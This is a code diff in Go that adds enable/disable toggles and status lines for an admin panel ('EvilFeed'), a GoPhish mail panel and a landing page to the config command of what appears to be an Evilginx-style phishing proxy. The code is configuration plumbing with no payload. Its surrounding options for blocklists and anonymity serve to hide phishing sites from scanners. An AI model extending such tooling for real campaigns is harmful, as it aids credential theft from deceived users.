@@ -259,6 +259,20 @@ func (t *Terminal) handleConfig(args []string) error {
 			anonymityUserAgent = "on"
 		}
 
+		// Admin panel status (base domain routing)
+		adminEnabled := "false"
+		mailEnabled := "false"
+		landingEnabled := "false"
+		if t.cfg.IsAdminPanelEnabled() {
+			adminEnabled = "true"
+		}
+		if t.cfg.IsMailPanelEnabled() {
+			mailEnabled = "true"
+		}
+		if t.cfg.IsLandingPageEnabled() {
+			landingEnabled = "true"
+		}
+
 		keys := []string{
 			"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert",
 			"gophish admin_url", "gophish api_key", "gophish insecure",
@@ -267,6 +281,7 @@ func (t *Terminal) handleConfig(args []string) error {
 			"turnstile enabled", "turnstile sitekey",
 			"cloudflare api_token", "cloudflare wildcard",
 			"anonymity enable", "anonymity headers", "anonymity useragent",
+			"admin enabled", "mail enabled", "landing enabled",
 			"blocklist enabled", "blocklist asn_file", "blocklist ua_file", "blocklist ip_range_file", "blocklist ip_list_file", "blocklist verbose",
 		}
 		vals := []string{
@@ -279,6 +294,7 @@ func (t *Terminal) handleConfig(args []string) error {
 			turnstileEnabled, turnstileCfg.SiteKey,
 			cloudflareToken, cloudflareWildcard,
 			anonymityEnabled, anonymityHeaders, anonymityUserAgent,
+			adminEnabled, mailEnabled, landingEnabled,
 			blocklistEnabled, t.cfg.GetRequestCheckerASNFile(), t.cfg.GetRequestCheckerUserAgentFile(), t.cfg.GetRequestCheckerIPRangeFile(), t.cfg.GetRequestCheckerIPListFile(), blocklistVerbose,
 		}
 		log.Printf("\n%s\n", AsRows(keys, vals))
@@ -343,6 +359,30 @@ func (t *Terminal) handleConfig(args []string) error {
 				} else {
 					log.Success("telegram: test message sent successfully")
 				}
+				return nil
+			}
+		case "admin":
+			switch args[1] {
+			case "enable":
+				t.cfg.SetAdminPanelEnabled(true)
+				t.manageCertificates(true) // Request cert for base domain
+				log.Success("admin panel enabled at /admin/ -> EvilFeed")
+				return nil
+			case "disable":
+				t.cfg.SetAdminPanelEnabled(false)
+				log.Success("admin panel disabled")
+				return nil
+			}
+		case "mail":
+			switch args[1] {
+			case "enable":
+				t.cfg.SetMailPanelEnabled(true)
+				t.manageCertificates(true) // Request cert for base domain
+				log.Success("mail panel enabled at /mail/ -> GoPhish")
+				return nil
+			case "disable":
+				t.cfg.SetMailPanelEnabled(false)
+				log.Success("mail panel disabled")
 				return nil
 			}
 		}
